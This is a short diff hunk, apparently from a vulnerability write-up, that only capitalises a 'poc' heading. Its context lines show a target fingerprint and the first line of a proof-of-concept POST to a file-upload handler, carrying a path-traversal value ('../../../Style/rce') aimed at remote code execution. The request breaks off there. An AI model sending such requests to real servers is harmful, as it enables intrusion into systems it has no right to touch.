@@ -8,7 +8,7 @@
 body="/Assistant/Default.aspx"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/rce HTTP/1.1
